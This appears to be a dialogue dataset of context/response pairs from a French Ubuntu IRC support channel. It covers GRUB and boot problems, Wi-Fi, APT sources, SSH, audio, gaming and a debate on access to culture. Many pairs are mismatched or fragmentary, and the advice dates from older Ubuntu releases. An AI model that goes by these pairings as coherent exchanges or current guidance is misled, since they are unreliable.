bonne soirée	ah ouais quand même. il est temps. bonne upgrade.
ah ouais quand même. il est temps. bonne upgrade.	ouais, une precise avec du pinning dans trusty et utopic :D
ouais, une precise avec du pinning dans trusty et utopic :D	et pourquoi upgrader aujourd'hui ?
Qu'est-ce que vous appelez une appli "temps de maïs", en vérité ?..	"temps de maïs explosé" tu connais pas ? traduit en anglais mot à mot :)
"temps de maïs explosé" tu connais pas ? traduit en anglais mot à mot :)	d'acc, je cherche en anglais..
le DLNA est découpé en trois parties distinctes	 sauf que dlna c'est un serveur/client, pas serveur/client/télécommande
 sauf que dlna c'est un serveur/client, pas serveur/client/télécommande	si si :)
:)	si ça utilise le standard DLNA, pas besoin d'avoir une appli spécifique
(ce que je recherche c'est un CLIENT dlna et non un serveur)	un truc comme ça ? https://apps.ubuntu.com/cat/applications/oneiric/gupnp-tools/
Merci pour l'aide, je repasserai si je n'y arrive toujours pas :)	piste: http://ubuntuforums.org/showthread.php?t=2186052
je sais pas trop...	tu peux essayer grub-probe ?
Hier je ne connaissais même pas le terme de "grub"...	tu es en uefi, ou bios ?
non, sauf si on passe par le bios pour booter sur la clé	tu peux préciser le "Lors de la première connexion," ?
et ça marche j'imagine ?	pourrait se rendre compte qu'il installe le grub sur le media qui lui a servi à faire l'install quand meme
pourrait se rendre compte qu'il installe le grub sur le media qui lui a servi à faire l'install quand meme	je pensais plutôt à un truc que je croise de temps en temps: la clé est le premier disque, le disque le second, et grub se configure pour booter sur le second disque. quand y'a plus la clé, le disque devient le premier et patatra
Wow, merci piti, je n'imaginais pas du tout ce genre de problêmes, j'étais resté de l'idée que cela venait du driver iwlwifi.	t'as pu tester du coup ?
Alors déjà, je suis sous xubuntu, mais je me suis permis d'aller ici car je ne pense pas que le problême soit spécifique a xubuntu.	ce que j'imagine, c'est que l'antenne (qui est vraisemblablement dans l'écran se met à émettre et recevoir sur un plan vertical quand il est rabattu
Oui, je l'utilise en SSH et Apache, et non, je ne peux pas avoir de vrai conditions de connexion (pas d'ethernet ou de wifi a fond, donc)	comment est regler ton ubuntu quand tu ferme/rabat l'ecran ?
L'ordinateur n'est pas en veille, seul le wifi ne fonctionne plus.	tu souhaites utiliser ce laptop comme serveur ?
d'accord Marmotte, merci :)	tu peux essayer Shumway
ça marche pas dans le player de facebook	j'ai supprimé flash de toutes mes machines depuis plusieurs mois, et je n'ai jamais été inscrit sur Facebook, donc je n'ai pas ton problème
autant mettre une petite VM dans un virtualbox (enfin c'est que mon avisà	en fait, je vais essentiellement utiliser Ubuntu. Mais comme le PC est sous Windows de base, je me dis, autant le garder au cas où.
J'aurais besoin d'aide, ou d'un bon tuto, pour installer Ubuntu en dual bot. Avec Windows 8. Sachant que je connais très mal Windows, et que je connais un peu Linux en tant qu'utilisatrice lambda, mais pas trop en tant qu'admin.	as tu regardé les pages de doc correspondante ? https://doc.ubuntu-fr.org/cohabitation_ubuntu_windows
sur de bons logiciels, c'est très facile	avait raison. le ppa stable me propose 222 paquets ( au lieu de 444 unstable ) avec les memes noms ( libx11-dev ... ) . Ca sent pas bon .
oui, pas besoin de PPA	ok j'ai voulu une version plus récente. mais en restant avec les paquets.
sinon compile depuis les sources...	sse moque du ppa ?
enfin si t'as rajouté le ppa via le terminal	ok
une tite fonction dans le shellrc, et c'est plié	je pensai plutot utiliser logger
bonjour, quelqu'un connaitrait un petit soft pour prendre garder une sorte de journal de bord ? Je ne cherche pas une todo list mais plutot un done list.	après, ça peut se résumer à un date; echo XXX >> ~log.txt
sinon, y'a plein de gens qui aiment bien orgmode qui doit pouvoir faire ça	orgmode, faut avoir 6 doigts à chaque main pour s'en servir
ou un petit script écrit toi meme?..	justement avant de le faire j'aimerai savoir si ça n'existe pas déjà
http://zim-wiki.org/	je cherche plutot un outils du terminal où je pourrai taper qqchose comme ça : $done "Install apache" et le soft s'occupe de stoquer la date dans un fichier journalier
# tc qdisc add dev eth0 root netem delay 100ms	http://lartc.org/howto/lartc.qdisc.classful.html
on peut configurer différentes options par utilisateur a ton avis ?	ca ajoute une file d'attente qui colle un delay de 100ms à tous les paquets envoyés à eth0
okay merci ;). ensuite, j'amerais surtout savoir à quoi sert 'root'	il faudrait faire de la QOS pour te réponse, c'est pas mon cas :D
bon beh je vais plus pouvoir utiliser notepad++	tu peux regarder ton /var/log/auth.log ?
fatal: no matching mac found: client hmac-sha1,hmac-sha1-96,hmac-md5 server hmac-sha2-512,hmac-sha2-256,hmac-ripemd160 (preauth)	tu utilises une version outdated de Filezilla
pourtant je peux me connecter en ssh	tu peux check ton /var/log/auth.log ?
PC master race. :p	+1 :p
@+	après, le "moins d'1K/mois" s'applique aux parents pour leurs enfants
bein ça doit être el cas, ce dernier est natif, donc no problemo concernant les perfs, si tu as ton driver privateur d'installé :)	je pense aussi mais j'aimerai avoir des retour avant de devoir me cree un dualboot sur ma machine de jeux
je pense aussi mais j'aimerai avoir des retour avant de devoir me cree un dualboot sur ma machine de jeux	d'un matériel à un autre la réponse va être variable
:D	juste que c'est un jeu quant meme gourmant (sous windows) et je voudrai savoir si je passe sous linux sa serra mieux :)
https://www.winehq.org/search?q=ark	il est sorti sous linux je ne veux pas de bench sous wine
Perso je suis loin de gagner 1K/mois	ça donne quoi Steam sous Ubuntu ?
non je parle d'un couple avec un enfant au chomage par exemple	j'ai grandi sans TV chez moi, hein, je l'ai tres bien vecu
c'est pas pour "tous"  mais pour une partie de la population qui a les moyens d'acceder à la dite oeuvre, oui c'est l'auteur qui a le dernier mot ça je pense que c'est logique, mais pourquoi un enfant de 4 ans ne pourrait pas parler du dernier dessin animé à la mode à son école …	et pourquoi voudrait il en parler ? parce qu'il y a 12 affiches publicitaires avec le bousin d'afficher sur le trajet de l'ecole peut etre ?
et pourquoi voudrait il en parler ? parce qu'il y a 12 affiches publicitaires avec le bousin d'afficher sur le trajet de l'ecole peut etre ?	bein un enfant de 4 ans, faut lui expliquer ça :/
à 4 ans, la culture, tu l'as de tes parents	bein si ils ont pas l'argents pour emmener l'enfant au cinéma ?
bein si ils ont pas l'argents pour emmener l'enfant au cinéma ?	s'ils en sont là, en France, ils reçoivent des aides pour le développement de l'enfant
voilà :)	bah, ses parents sont là pour faire quoi ?
ça se défend comme position avelldiroll, mais ce que je tollère pas pour ma part, c'est pourquoi le "pauvre" ne peut pas avoir un accès à la culture dite "récente"	est-ce que c'est pour autant juste de "forcer" (autant dans le choix de l'auteur, que dans celui de l'utilisateur qui va contre la licence choisie) un auteur ?
ah clairement	pour la meme raison qu'un auteur à le droit de choisir si il veut monetiser son oeuvre ou pas …
pour la meme raison qu'un auteur à le droit de choisir si il veut monetiser son oeuvre ou pas …	et bein donc l'essence même de la culture pour tous s'effondre
et bein donc l'essence même de la culture pour tous s'effondre	ce que tu reclames ce n'est pas un acces à la culture, c''est un acces gratuit à ce qui est publicisé, et si c'etait gratuit, par definition ce ne serait pas publicisé
ouep	c'est pas un acces à la culture que tu reclames, c'est de recuperer ce que des publicitaires veulent te fourguer, c'est pas pareil
l'accès à la culture pour tous avelldiroll, pourquoi le pauvre ne devrait pas avoir accès à la culture ?	alors ca s'appelle le domaine public, y a plus d'oeuvre dans le domaine publique que tout ce qu'un individu pourra consommer comme produit culturel au cours de sa vie
pas les assets	tu as planeshift si tu veux une histoire dans un jeu libre http://www.planeshift.it/ … c'est meme un mmo
donc du logiciel...	le moteur
mais je fais quoi pour ma dose de RPG occidental ?	meme probleme: un scenar, c'est une oeuvre artistique
pas de shadow maps, ni de réflexion d'eau	j'ai testé y a 2 mois, c'est pas équilibré du tout
le gameplay y était sympa, bien que c'était pas très beau et un peu buggé	pour dwarf fortress le fait que ce soit gratuit mais proprio fait que personne n'est aller fouiller le code pour optimiser une strategie absolue, je vois l'intérêt du proprio dans ce cas
OAD c'est tres bien, mais pas jouable, quand il sera utilisable il sera tres daté	il y a déjà des gens qui y jouent en multi et qui s'amusent
et même comme ça, le top des jeux "rétro 2D à concept sympa" sont proprios pour la plupart :/	il y a Tanks of Freedom :p
et puis, comme dit avelldiroll, de meilleurs graphismes ne font pas un meilleur jeu	ce n'est pas ce que je veux dire, je dis juste qu'un jeu libre ne peu pas se permettre de reposer sur des graphismes, il doit viser des mechaniques originales si il veut percer
les développeurs de Godot aussi... :p	non, mais réaliser un game-design & un level-design précis ça demande aussi du pognon :p
c'est de la Gamecube :)	installe le jeu et regarde, ça vaut 10 fois un screenshot ^^
installe le jeu et regarde, ça vaut 10 fois un screenshot ^^	vu la puissance des consoles PS4/XOne, je dirais une CG à 250€ max en fait
voilà ou on en est côté graphique	à condition d'avoir la CG à 500 euros...
c'est une fausse bonne idée :/	ces jeux sont très bien, mais datés technologiquement
"biens numériques" c'est le nouveau mot 2.0 pour dire "licence d'utilisation" ?	le witcher1, sur gog en promo, il doit être moins de 2€, et il tourne sous wine
Vous avez dit "propriété intellectuelle" ? C'est un séduisant mirage :)	l'un des jeux les plus moddable est propriétaire :)
Simounet > Ton lien me fait penser à un test que j'ai fait hier, avec un "wine steam.exe -no-dwrite" justement	tu peux regarder aussi sur https://appdb.winehq.org/ tu as plein d'info
(Mon steam spécial Linux fonctionne très bien lui)	tu as essayé via playonlinux ?
!wiki steam	http://doc.ubuntu-fr.org/steam | http://doc.ubuntu-fr.org/steam_jeux | http://doc.ubuntu-fr.org/team_fortress2 | http://doc.ubuntu-fr.org/steamcmd | http://doc.ubuntu-fr.org/cssource
quelques âmes charitables pour m'orienter dans la résolution de ma configuration multimoniteur ?	pose ta question directement
Oui :)	Marseille fait pas vraiment parti de mes destination :p
bah tu dois pouvoir ssh dessus	Takka : Merci de votre aide !! Prochain passage à Marseille, je vous paye une pinte !!!
une fois que c'est fait, service networking restart	alors j’ai bien rajouté la ligne, mais pour redémarrer le service, j’ai un Job failed while stopping / Job is already running networking
route add -net 195.0.0.0 netmask 255.0.0.0 gw 195.154.161.1  ?	ajoute la ligne que je t'ai dit (genre au dessous de broadcast)
http://postimg.org/image/q0rdpys21/	T'as essayé de pinger une machine dans le réseau local?
T'as essayé de pinger une machine dans le réseau local?	Malheureusement je n’en connais pas
Malheureusement je n’en connais pas	T'as pas d'autre serveur dans le même réseau?
T'as pas d'autre serveur dans le même réseau?	non
195.154.161.175	c'est normal que y'ait pas de gateway ?
c'est normal que y'ait pas de gateway ?	Takka : Aucune idée …
Takka : Aucune idée …	tu peux pinger la gateway
Désolé pour l’image, mais avec iKVM je n’arrive pas à copier coller	dans ton fichier interfaces
piti : http://postimg.org/image/54ja0d2vr/	rajoute un gateway 195.154.161.1
piti : network unreachable	ip a liste l'ip listée sur em1 ?
piti : J’ai essayé un ping google.com, et résultat, unknown host google.com	T'as regarder ifconfig pour voir si t'as bien une carte réseau de démarrer et si t'as une passerelle?
T'as regarder ifconfig pour voir si t'as bien une carte réseau de démarrer et si t'as une passerelle?	J’ai sur em1 Link encap: Ethernet avec la bonne ip, et lo sur local loopback
J’ai sur em1 Link encap: Ethernet avec la bonne ip, et lo sur local loopback	t'as pas de gateway?
Et comme je suis un bon débutant, je ne sais pas par quoi commencer pour debug tout ça ...	regarde dans /etc/network/interfaces
non pour toute usage	sinon config basic un swap de 2Go voire 3Go
les partition que j'ai creer sont 20 GO pour un autre systeme et 20 GO pour mes donnees personnels et ma machine dispose de 2 GO de memoire vive et mon disque dur a 160 GO et au finale j'ai 120 GO d'espace disque	quel usage ? bureautique ?
et je reussi pas s'il te plait peut tu me proposer	c'est pas très compréhensible ta phrase là
c'est louche	reboot ta machine avec le wifi allumé
ça veux dire AMD 64 bits ?	hors contexte, chaud de te répondre
!wiki modules	http://doc.ubuntu-fr.org/modules_php | http://doc.ubuntu-fr.org/gwenview | http://doc.ubuntu-fr.org/audio_intel_hda | http://doc.ubuntu-fr.org/diagnostic_outil | http://doc.ubuntu-fr.org/ndiswrapper
!paste	ça serait bien de voir le kern.log aussi
personne poour m'aider à trouver ma carte wifi ?	c'est du pci ?
Du coup on est en train de la restaurer mais ça devra attendre demain	tu dois pouvoir réduire une partition et utiliser l'espace gagné pour /boot non ? :/
tu dois pouvoir réduire une partition et utiliser l'espace gagné pour /boot non ? :/	Non, la partition est vérouillé
woot? Oo	sudo dpkg -r linux-image-x.x.x-xx-generic mais j'ai pas un grand espoir :)
sudo dpkg -r linux-image-x.x.x-xx-generic mais j'ai pas un grand espoir :)	On peut rien faire avec gparted et la VM ne veux plus démarrer --"
faudrait voir ce qu'il te dit	On fait une sauvegarde de la machine et je te tiens au jus
C'est pour mettre dans mon garage il tournerait pour lire des pdf, radio, du web	si tu ne connais pas trop le détail, ce qui est proposé par défaut est très bien
oui	à priori non. Suivant les usages, certains systèmes de fichiers peuvent être plus intéressants
Ah sans anglais ça devient vite dure de bidouiller ^^ Après si ça peut te rassurer l'anglais de ce type de documents est souvent le même, donc s'apprends vite. Par contre pour tout S5 ils sont en train de travailler dessus, donc pas impossible que ça sorte bientôt !	si tu fait un fichier ~/.asoundrc avec dedans http://paste.ubuntu.com/11909009/ ça corrige le soucis ?
Merci a toi tobiasBo1 mais dégouté mon téléphone n'en fait pas partie...	Il faut des téléphones relativement puissants pour pouvoir lancer UbuntuPhone...
Il faut des téléphones relativement puissants pour pouvoir lancer UbuntuPhone...	j'ai un galaxy S5 4g donc je pense qu'il est assez puissant
j'ai un galaxy S5 4g donc je pense qu'il est assez puissant	Pour plus de précision tu as un canal réservé (en anglais par contre) :  #ubuntu-touch
mais c'est pas lié je pense	Ca peut venir de fait que je suis en live CD (je réinstalle mon système en ce moment)
Ca peut venir de fait que je suis en live CD (je réinstalle mon système en ce moment)	tu vois une différence en utilisant alsa directement ? (mplayer -ao alsa...) ?
tu vois une différence en utilisant alsa directement ? (mplayer -ao alsa...) ?	Par contre si je mets  mplayer -ao alsa:device=hw=0.0 je n'ai plus aucun problème...
Par contre si je mets  mplayer -ao alsa:device=hw=0.0 je n'ai plus aucun problème...	hum... tu pourrais m'envoyer la sortie de "aplay -l" ?
hum... tu pourrais m'envoyer la sortie de "aplay -l" ?	http://paste.ubuntu.com/11908965/
http://paste.ubuntu.com/11908965/	étrange pourtant tu as une seule sortie
Est ce que quelqu'un sait s'il est possible d'installer ubuntu Touch sur nos smartphones ??	Tu as la liste des appareils supportés ici : https://wiki.ubuntu.com/Touch/Devices
ah oui ok, c'est possible que ce soit ça	J'ai essayé l'astuce du mplayer, même bug, sauf que je vois pendant la lecture des "Audio device got stuck !"
par contre la solution proposée me donne une erreur  [pulseaudio] module.c: Failed to load module "module-udev-detect" (argument: "#tshed=0"): initialization failed.	tu as mis un "#" en trop ?
tu as mis un "#" en trop ?	Oups j'ai bettement recopié l'erreur d'un mec sur le net croyant que c'était la même que la mienne,, mais voici l'erreur exacte que j'ai : [pulseaudio] module.c: Failed to load module "module-udev-detect" (argument: "tshed=0"): initialization failed.
hum ? :)	Désolé problème de réseau ^^ J'ai essayé et ça me donne la même sortie...
Désolé problème de réseau ^^ J'ai essayé et ça me donne la même sortie...	pas d'autre idée, tu as essayé de changer de plugin de sortie audio ?
ça force l'utilisation du driver basic	avfdsvva
Et j'ai essayé d'utiliser Debian 8.1, Xubuntu 14.04, Kubuntu 14.04 et Xubuntu 15.04, et toutes ont le même bug.	tu as des erreurs dans les logs du systemes ?
tu as des erreurs dans les logs du systemes ?	Dans /var/log/syslog ?
Dans /var/log/syslog ?	par exemple
je l'avais pas reessayer celle la.je vaix retester ca je fini une mise a jour vers le sp3 et je relance	le filesystem de ta clé usb c'est -> ?
l'erreur clasique tu me diras et j'en ai lu des tutos mais la je seche	la limite ca être ton o/s -> Linux Mint
j'ai essaye une ubuntustudio meme chose	Donc il boot bien sur la clé USB : C'est une install 64 ou 32 sur ta clé ?
j'ai essayer de les configurer comme disque dur aussi mais il ne veux as non plus et le bios est a jour	tu avais installé grub sur ta clé usb ?
yep	mais je peux te donner un indice, si tu installes grub sur ta clé usb, ton ordi pourrait voir ta clé usb comme un hdd :)
je crois bien qu il va resersous xp	désolé, mais tu n'es pas sur le bon channel :(
et un kernel de non reconnu pourtant je vien de cree une clef avec rufus avec l'iso d linuxmint 32bit	tu essayes de booter sur quelle distribution ? linux mint ?
la cle boot sur un autre pc	Tu n'utilises pas un HUB usb ? As tu essayé toute les prises USB ?
oui	c'est le sources.list par défaut d'ubuntu 15.04
c'est le sources.list par défaut d'ubuntu 15.04	oui c'est bien ce que j'ai dans /etc/apt/sources.list
avelldiroll : j'ai trouvé : dans le fichier /etc/apt/sources.list	http://paste.ubuntu.com/11908383/
avelldiroll : Sais-tu ou sont les dépôts de la distribution ?	où sur ton systeme de fichier ou où à quelle adresse ?
que les paquets qui gènent?	quoique si en fait je découvre que les dépôt de la distribution ne sont pas là
donc un rm  * sur le repertoire /etc/apt/sources.list.d devrait resoudre le problème	NOOOONNNN
c'est à dire que lorsqu'il a créé ce cd, il pouvait réécrire dessus à ce qu'il me dit	essaie de hexdump un des fichiers pour vérifier que c'est pas que des 0x00
https://www.humblebundle.com/store/search/platform/linux	tu joues a quoi toi ? Y a borderland qui me plais bien
tu joues a quoi toi ? Y a borderland qui me plais bien	Tu as joué à Braid ?
bonsoir a tous	Salut
une idéé?	quel rapport entre nginx et nodejs?
c'est pour attiré l'attention :)	ca n'a rien à faire sur un salon de support :/
enfin, toujours est il que même si je devais relancer ça à chaque démarrage, opencl fonctionnait. Maintenant, quand je lance mon programme (qui marchait avant) j'obtiens ça : http://pastebin.com/uLa66nX1	pour les portables qui ont besoin de ressources graphiques, je désactive optimus dans le bios (seul la CG marche) ça consomme plus, mais au moins ça marche normalement ):
rha xD	git aime
c'est toi qui l'utiliseras, donc choisis ce qui te semble le plus simple/ce que tu préfères/etc.	pouete juste un doute : PXE c'est pour installer; mais on peut tester en live avant ? car c'est aps mon pc je voulais faire un test avant
mais sans doc je saurais pas par ou commencer	utilise la methode que tu trouve la mieux adaptée :)
(ce n'est pas mieux ou moins bien parce que "clic clic" :P)	plus facile a prendre en main je vais dire ;)
t'as un lien doc ?	j'en sais rien pour la doc, mais j'ai pas touché à iptables non plus...
et le fichier de conf est vraiment très simple	tu parles de ca ? https://help.ubuntu.com/community/Installation/QuickNetboot
mais savez vous comment mettre l'ISO Ubuntu sur la clé USB de manière à quelle fasse croire qu'elle est un lecteur de disquette ? car dans le bios boot order je vois "floopy".   Je crois que c'est possible, car il existe un linux spécial vieux pc ( pupppy linux  ou Toutou linux ) qui permettait de faire ca	ben go PXE si la vieille machine suporte
un conseil ?	tu as branché la clé USB sur quel port ? essaie un autre port
En faite il n'y pas de mise a jours du package mais pour la niveau de version, oui.	/etc/apt/sources.list ? (avec les /etc/apt/sources.list.d/*)
j'ai souvent du mal à repérer ces inversions là, vu que je fais une fifférence entre les sons [sé] et [sè]	désolé pour les [éè] inversés.
gné?	il a installé un package, puis a pété l'install en compilant un logiciel, et ça pose problème pour le dist-upgrade
il a installé un package, puis a pété l'install en compilant un logiciel, et ça pose problème pour le dist-upgrade	ca j'avais compris, l'install est cassée depuis qu'il a compilé sur en ecrasant un paquet installé, sans le virer proprement avant de deployer sa compil, c'est les "c'est packages" que je ne comprends pas
  libxine2-x vdr-plugin-vnsiserver	apt-get upgrade est différent de apt-get dist-upgrade
*svp	utilise le Pen Drive Linux's USB Installer si tu es sous Windows, plutôt qu'Unetbootin : http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-windows
ha ok XDDD	c'est un salon de support, les sondages ont peu de chance d'obtenir des reponses, pose directement ta question avec le plus de details possible, tu verras bien si quelqu'un peut/veut te repondre
mais rien à voir avec ubuntu	oui je sais.. exceptionnelement je demandais à tout hasard par ici ;)
j'aurais besoin d'un peu d'aide pour désactiver tous les timeouts sur mon serveur ssh, de façon a ce que je puisse resté connecté en permanence dessus...	tu peux les augmenter, mais ca peut poser probleme, l'autre solution c'est d'utiliser des choses comme mosh
Quelqu'un arrive à me lire ou je bug ? (parce qu'on m'a jamais répondu en fait depuis que je viens ici...)	 salut, on te lit bien, mais personne n'est présent
+x	ça dépend, je pourrais utiliser mon VPN perso pour lire des films qui sont sur un serveur chez moi, quand je suis ailleurs
Si c’est un tar.gz, tu fais "tar xfvz monarchive.tar.gz", si c’est un tar.bz2, tu fais "tar xfvj monarchive.tar.bz2", et si c’est un tar tout bête, "tar xfv monarchive.tar". Le tout dans un terminal dans le dossier où se trouve ton archive.	le tuto a plus de 5 ans, gnome a changé de version depuis, et le tuto semble avoir été redigé avant qu'unity soit le DE par defaut d'ubuntu
que je veux installer	qu’est-ce qui ne va pas quand tu suis le tutoriel ?
oui	commence par repondre à la question que te posait mezen plus tôt
ah tu prends mes infos comme tu veux … je n'ai rien à vendre	Je suis tout ouïes, c’est juste que je relève une contradiction possible entre ce que tu me dis et ce que j’ai pu lire ailleurs, mais ce que tu me dis s’applique sans doute (hélas) dans mon cas.
j ai besion d aide pour installer un ficher tar que j ai telecharger  svp	c'est quoi exactement ?
Est-ce que certains utilisent les depots dev en dépots par défaut ?	les sondages ne mènent à rien ici
piti:dans le /boot c'est qui, j'ai dossier grub et efi et fichier vmlinuz, system.map, config...	pas compris
pas compris	les noyaux sont dans /boot? parceque au demmarage il me dit que le dossier /boot est complpet
ok merci piti, je teste	tu peux supprimer les paquets associés si y'en a (genre linux-headers-numéro-du-noyau
?	celui que tu utilises en ce moment: uname -a
hello world	supprimer des anciens noyaux non inutilisés ?
désolé :-)	que veux tu savoir ?
quelqu'un pourrait m'aider à désactiver le timeout de ssh ? :)	man sshd_config, option TCPKeepAlive
mais je réussi à copier sur une clé usb	quand tu inseres un de tes cd/dvd tu as quoi qui s'afficher dans ton kern.log ?
Quelqu'un aurait une piste?	NicoP
et puis de toute façon firefox os > android	tout comme "cat" > "vim" ouais
par ex mes messages sur fond d'une couleur et ceux de mon correspondant sur fond d'une autre couleur	c est #ubuntu ici pas #android
très basique mais efficace :)	Oui mais je vais pas mettre toutes les ip de site XX
le 64 bits  c est AMD64	hey tiot ! , tu viens plus sur l'autre chan ?
l'architecture c'est x86 apres y a 32 ou 64bits	à la ligne version on ne peut que choisir 32 bits  http://www.generation-nt.com/zoom-353731,745951,4-vboxparam2.html
x86 + x64	dans virtualbox 5  ou 4.3 dans les invites de configuration, on a plus que celles de x86 (je ne dit pas que le 64 ne marche pas)
préinstallé, tu le mets sur un disque dur, c'est une copie d'une installation	on peut mettre une préinstallé sur virtualbox ?
pour les 5 types de machines citées	merci pour ta réponse. Je saisie pas la différence entre live (live cd je comprends), mais préinstalled ?
donc avec le tien, toi qui le trouves, ca devrait le faire, non ? :p	je doute :/
il a bien main et universe	je vais l'essayer après , 15 je re
oui mais lis le tuto de beaver	ça marche pas :/
je regarde	pour toi (aussi)
http://sources-list.ubuntu-fr-secours.org/sources-list.html	pour toi
-cz +fr	une seconde je vais le voir
" ça ferai quoi en anglais ? probablement je trouverai qq chose sur google :p	deb http://cz.archive.ubuntu.com/ubuntu trusty main universe     dans ton sources.list ?
non	rien de tt lol, j'essaye juste d'installer gnomeradio :/
lawl	j'ai rien compris lol
pas de mp claudio__ s'il te plaît, tout en live ici :)	" Impossible de trouver le paquet gnomeradio
" Impossible de trouver le paquet gnomeradio	tes dépots tiers qui ont fichu le "dawa" dans ta distrib, du moins je vois que ça quoi :s
12.10, quantal, no lsb aviable	faut pas confondre le pseudonyme Dro__ et toi ;)
surtout depuis la 12.10	No LSB modules are available.
on peut pas updater en ligne?	si mais ça va être tres fastidieux
(desolé je viens de voir ton msg)	tes màjs sont faites ?
tes màjs sont faites ?	 oui
 oui	c'est bizarre lsb_release -a retourne quoi ?
comment faire pour passe a ubuntu 14 ou 15 ans cd? sur une machin ubuntu 12.10 ??	via usb ?
ah oui dur	apt-cache show gnomeradio retourne: N: Impossible de trouver le paquet gnomeradio
je vais regarder ton deuxieme lien beaver	tu veux la réponse en Français ou bien ?
salut beaver	c'est ce que tu cherches ou bien ?
car le nom du package est bon	j'ai fait le update mais ça marche pas :/
salut	blender par exemple serai trop compliqué pour le gars
c'est pas mon domaine, mais il m'a semblé doté de pas mal de fonctionnalités	restreint au niveau des effets apparrament
et kdenlive il me dit "trop restreint"	ça peut valoir le coup de jeter un oeil sur https://doc.ubuntu-fr.org/openshot
Salut Calinou!	le mieux est d'essayer et de se faire une idée
j'ai trouvé "flumotion" mais c'est peut etre pas le mieux	tu as modifié sources.list?
Merci d'avance	je ne sais ce qu'est une question TOP, mais on dirait qu'il faut que tu modifies les fichiers listés avec ce qui est montré par les diff
ça te fait la même chose avec un nouvel user, de test ?	non c'est pas mon ordi, c'est celui d'un collègue
quelqu'un aurait une idée pour résoudre le symptome suivant : Les clicks souris ne fonctionne plus sur le dash, c'est le bureau  derrière qui les reçoit ...	tu as essayé de juste relancer ta session ?
tu as essayé de juste relancer ta session ?	oui ça dure depuis 1 semaine
et gdebi arretais pas de planter	ta machine aurait pas un souci ?
ok	Unity, GNOME, KDE, Xfce, LXDE... c'est juste une histoire de goût
Bonjour, il y en a parmis vous qui utilisent krita ? J'en ai mare de reboot sous windows juste pour faire un tpl pour des fuc**** CMS ... Tout semble me convenir dans Krita sauf que je ne trouve pas un équivalent du ruler guidelines ... http://i.stack.imgur.com/ErXF5.jpg Et sans ça faire du web design c'est un peut ****** :) Merci	gimp a pas de bons outils pour ça ?
donc je devrai pouvoir repondre a tes question dans environ 1ou 2h si ca plante pas entre temps pour l'installe	Tu n'as pas un dvd-rw tu es sur de bien faire ta clée
alors les gars un idee?	Tu as pris qu'elle image? Une Ubuntu 15.04 ou une gnome-shell
svp... question j'installé  LAMP et creé un projet de site sur /var/www mais quand je lance http://localhost/monprojet ... reponse ERROR 404	que te donne http://localhost ?
il me semble que microsoft a flingué le rdp il y a un moment en demandant des licenses pour pouvoir se connecter: https://www.microsoft.com/en-us/licensing/product-licensing/client-access-license.aspx … mais bon, c'est un probleme coté windows, c'est à leur support qu'il faut s'adresser	J'ai utilisé remina
bon de toute façon je vais ettre mon ordi en SAV	si ton pc a été livré avec windows, je penses que tu dois remettre windows pour le SAV
mezen regarde ça c'est les log une fois le cd mis dedans http://pastebin.com/8yfkZHUt	là ça n'a rien à voir avec le CD
mezen alors tu en pense quoi ???	j'ai trouvé laptop mode tools
mezen le cd a peut etre fait bugger quelque chose	un CD de quoi en fait ?
mais pourquoi ubuntu ne me preveint pas avant de s'etiendre ???	tu dois pouvoir programmer cela dans les paramètres système, icone Energie
mais j'ai du mal à croire au materiel, pourquoi ubuntu ne me previent pas avant de s'eteindre	à mon avis, pas de lien cause à effet pour le CD IBM
j'ai ce bug depuis hier et pile le bug est venu une fois que mon oncle est lancé un cd IBM bizzard ????? mezen	tu utilises ta batterie tout le temps ?
mezen par contre es ce que tu pense à un eventuelle virus ?	non je pense pas, les virus sur linux c'est très très rare
mezen ce qui est bizard c'est qu'il n'y a aucun lien entre les deux os.	je voulais juste voir si le problème vient d'ubuntu ou de ta batterie
Le model est ASUS N-550-jv	t'as le meme souci sous win ?
14.04 white_bear	essaye ça http://askubuntu.com/questions/89185/what-is-the-correct-way-of-setting-up-an-abnt2-keyboard-layout-in-preseed/258570#258570
je ne vois toujours pas ce que viens faire une consideration sur le client	c'est probablement plus parlant pour lui :D
c'est probablement plus parlant pour lui :D	je me doute que ca lui parle, mais ca ne me parle pas du tout à moi quand j'essaie de comprendre ce qu'il veut
(mais à toi de faire attention aux pouvoirs fournis avec sudo sinon un malin le désactivera)	oui je pense qu'il faut limiter les droits sudo pour commencer
j'aimerais loguer toutes les commandes lancés avec sudo, et du coup j'aimerais savoir s'il était possible de désactiver "sudo -i" (car ce qui sera ensuite exécuté dans le shell root ne sera pas logué)	auditd est ton ami
je voulais proposer des services dans la VM, me taper toute la configuration du lgociel, et que la personne a l'autre bout n'est plus qu'a démmarer la vm et le service soit dispo	pour faire ca, fait plutot du container, ca mangera moins de place, mais en vrai, ce que tu veux faire, c'est du packaging, c'est plus propre
est ce qu'il existe une version d'ubuntu sereur lite ? car actuellement avec ubuntu server 14.04 lts, je me retrouve avec une machine avoisinant les 1 go (c'est énorme)	tu dois avoir une iso minimale, et si tu veux plus, tu peux faire un debootstrap de ta distrib
par contre, ça peut valoir le coup d'ajouter un outil de cache de bytecode	C'est déjà mise en cache en bytecode
tu souhaite accélerer le chargement de tes pages ?	Je voulais savoir si le fait de monter mon dossier de cache en tmpfs serait plus rapide que de le laisser telquel sur le serveur ( accès au disque )
ton kernel va mettre en cache en effet, dans la mesure ou t'as de la ram disponible, ça devrait être bon	Oui j'ai toujours de la ram disponible
j'imagine qu'il est capable de reconnaitre un code 404/500 quand un site est en rad mais que les services tournent	https://www.monitoring-plugins.org/doc/man/check_http.html
Savoir quand apache/postgres/mysql whatever est dans les choux et qu'il faut relancer un site	regardes du coté des solutions de monitoring
Mais j'ai toujours, mes data qui sont sur deux disques en lvm. Et je ne comprend toujours pas pourquoi, ces deux disques ne sont plus montés automatiquement au démarrage, et pourquoi certain applis ne se lancent plus toute seule.	tu as consulté les logs ?
Bonjour, quelqu'un s'y connais en LVM? Et ou application et script de démarrage?	je suis certain que des gens s'y connaissent. Je doute un peu plus qu'il soit judicieux de faire de l'agrégation lvm sur des disques externes pour faire un backup, ou que répéter la question t'aide à trouver une réponse
pour verifie la cle je peux le faire des options quand il demande try xubuntu/install xubuntu/ oem installer?	je crois qu'il y a un choix dans la liste pour tester le CD
ok donc ca doit etre xubuntu sur la cle qui plante	vérifie aussi ta clef
dite svp j'ai un probleme avec xubuntu pourriez vous m'aidez?	les réponses dépendent grandement des questions :)
/home/eric/Téléchargements/	tu as essayé de voir comme te le disais avelldiroll avec ls -l (ou avec le gestionnaire de fichier graphique) ?
parfait	ça m'interresse de vérifier les permissions à cet endroit
aucune idée, je n'utilise pas soundjuicer, il est probable qu'il y ait des preferences, oui	c bon je crois que c résolu j'ai juste changer "aucun" par "Téléchargements"
